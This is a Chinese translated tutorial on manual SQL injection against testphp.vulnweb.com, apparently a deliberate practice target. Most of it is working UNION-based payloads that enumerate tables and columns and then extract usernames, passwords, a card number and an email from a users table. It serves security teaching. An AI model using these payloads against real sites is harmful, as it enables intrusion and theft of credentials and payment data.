
# [翻译]一步步手动进行SQL注入

这篇文章基于[上一篇文章](http://bbs.pediy.com/thread-218235.htm "SQL注入新手教程（第1部分)"),在那里我们利用dhakkan平台学习了采用不同的技术手动进行SQL注入。今天仍然是手动进行SQL注入,不过为了减轻你安装dhakkan平台的负担,这次改为使用在线网页[vulnweb.com](https://bbs.kanxue.com/elink@db8K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4k6#2L8r3&6%4k6h3u0Q4x3X3g2U0L8$3@1`.)。

开始吧!

首先,在浏览器中打开给定的目标链接[7eaK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4c8W2M7%4c8H3K9s2m8Q4x3X3g2$3N6h3I4F1N6$3g2T1i4K6u0W2j5$3!0E0i4K6u0r3j5i4u0@1K9i4y4@1M7#2)9J5k6i4m8Z5M7q4)9K6c8X3q4J5N6r3W2K6N6q4)9K6c8o6p5`.](https://bbs.kanxue.com/elink@1b4K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4c8W2M7%4c8H3K9s2m8Q4x3X3g2$3N6h3I4F1N6$3g2T1i4K6u0W2j5$3!0E0i4K6u0r3j5i4u0@1K9i4y4@1M7#2)9J5k6i4m8Z5M7q4)9K6c8X3q4J5N6r3W2K6N6q4)9K6c8o6p5`.)，我们将要对`id=1`进行SQL注入测试。

![](https://bbs.kanxue.com/upload/attach/202002/747240_3gljoz3jgpdcri1.png)

使用基于错误返回的注入技术，在输入的最后添加一个(`'`)来破坏查询，即：

`testphp.vulnweb.com/artists.php?artist=1'`

![](https://bbs.kanxue.com/upload/attach/202002/747240_bqiw41xaa44pxw2.png)

由上图可以看出，我们得到了一个错误返回信息。接着使用关键字`ORDER BY`对记录进行升序或降序排列，即：

`testphp.vulnweb.com/artists.php?artist=1 order by 1`

![](https://bbs.kanxue.com/upload/attach/202002/747240_cfjwd6yoizr6x87.png)

类似的，一个个地进行`order by 2`、`order by 3`等等，即：

`testphp.vulnweb.com/artists.php?artist=1 order by 2`

![](https://bbs.kanxue.com/upload/attach/202002/747240_kxminp99u37ydjh.png)

...

`testphp.vulnweb.com/artists.php?artist=1 order by 4`

![](https://bbs.kanxue.com/upload/attach/202002/747240_47nvn0lrfm269t2.png)

由上图可以看出，当`order by 4`时，我们得到了一个错误，这意味着只有三条记录。

现在使用基于联合查询的注入技术选择不同表的描述以进行更深入的渗透，即：

`testphp.vulnweb.com/artists.php?artist=1 union select 1,2,3`

![](https://bbs.kanxue.com/upload/attach/202002/747240_gfipga5cns3r27y.png)

由上图可以看出，只显示出了一个表的描述信息。

现在通过URL给数据库传递错误的输入，将`artist=1`替换为`artist=-1`（将第一条查询的结果集置为空），即：

`testphp.vulnweb.com/artists.php?artist=-1 union select 1,2,3`

![](https://bbs.kanxue.com/upload/attach/202002/747240_ve44u7nop2fu6dm.png)

由上图可以看出，显示的是后两列的表。

接着来获取数据库名，即：

`testphp.vulnweb.com/artists.php?artist=-1 union select 1,database(),3`

![](https://bbs.kanxue.com/upload/attach/202002/747240_tuhlczx7yyubp5e.png)

由上图可以看出，数据库名为acuart。

继续获取数据库系统版本和当前用户名，即：

`testphp.vulnweb.com/artists.php?artist=-1 union select 1,version(),current_user()`

![](https://bbs.kanxue.com/upload/attach/202002/747240_lpxinb32kev2qw2.png)

由上图可以看出，数据库系统版本为5.1.73-0ubuntu0.10.04.1，当前用户为acuart@localhost。

接下来我们要获取的是数据库中的表名，即：

`testphp.vulnweb.com/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1`

[![](https://bbs.kanxue.com/upload/attach/202002/747240_tvvmkc465ndfn5i.png)](https://bbs.kanxue.com/elink@185K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4g2H3L8r3!0S2k6q4)9J5c8X3q4@1N6r3q4U0K9q4)9J5c8U0t1H3x3U0l9H3x3W2)9J5c8U0M7@1y4K6t1@1x3q4)9#2k6Y4c8$3N6X3#2C8j5K6b7$3y4h3&6V1k6X3^5#2K9g2)9J5k6i4m8F1k6H3`.`.)

由上图可以看出，第一个表名为`artists`。（注：这张图是译者所截，原文此处有误，已通知原作者，待原文修正后此图删除。）

与此类似的查询可得到剩余的表名，即：

`testphp.vulnweb.com/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 1,1`

![](https://bbs.kanxue.com/upload/attach/202002/747240_ji9w9rpjjojiww1.png)

由上图可以看出，第二个表名为`carts`。

`testphp.vulnweb.com/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 2,1`

![](https://bbs.kanxue.com/upload/attach/202002/747240_jxvb4p822pht63p.png)

由上图可以看出，第三个表名为`categ`。

`testphp.vulnweb.com/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 3,1`

![](https://bbs.kanxue.com/upload/attach/202002/747240_5s68j0au9uh3ywr.png)

由上图可以看出，第四个表名为`featured`。

...

`testphp.vulnweb.com/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 7,1`

![](https://bbs.kanxue.com/upload/attach/202002/747240_gmzsnahp2g4knnf.png)

由上图可以看出，第八个表名为`users`。

`testphp.vulnweb.com/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 8,1`

![](https://bbs.kanxue.com/upload/attach/202002/747240_s9mp1s1hfsfotdv.png)

由上图可以看出，当limit设置为 8,1 时得到的是空白页面，这意味着此数据库中只有八张表。

`concat`函数用于将两个及以上的字符串连接为单个字符串。可用于一次性查询所有表名，即：

`testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()`

![](https://bbs.kanxue.com/upload/attach/202002/747240_ivc93h5k1br4tnn.png)

由上图可以看出，所有的表名依次是：

1. `artists`
2. `carts`
3. `categ`
4. `featured`
5. `guestbook`
6. `pictures`
7. `products`
8. `users`

我们或许可以从`users`这张表获得一些重要的信息哟，来进一步渗透吧！

继续使用`concat`函数来获取表`users`的所有列名，即：

`testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'`

![](https://bbs.kanxue.com/upload/attach/202002/747240_y8jflhopsr59r3o.png)

由上图可以看出，我们已经成功获得了表`users`的八个列名。

接下来，选择其中四列`uname`、`pass`、`cc`和`email`作为示例进一步枚举。

继续使用`concat`函数从表`users`中查询`uname`，即：

`testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(uname),3 from users`

![](https://bbs.kanxue.com/upload/attach/202002/747240_mzq5g5bth55xhnw.png)

由上图可以看出，`uname`内容为test。

同理查询`pass`，即：

`testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(pass),3 from users`

![](https://bbs.kanxue.com/upload/attach/201707/747240_kmvzpkhfrwp7u5f.png)

由上图可以看出，`pass`内容为test。

同理查询`cc`，即：

`testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(cc),3 from users`

![](https://bbs.kanxue.com/upload/attach/201707/747240_vn4m36hjyj9o2sk.png)

由上图可以看出，`cc`的内容为1234-5678-2300-9000。

同理查询`email`，即：

`testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(email),3 from users`

![](http://bbs.pediy.com/upload/attach/201707/747240_igb24camf045xe5.png)

由上图可以看出，`email`内容为jitendra@panalinks.com。
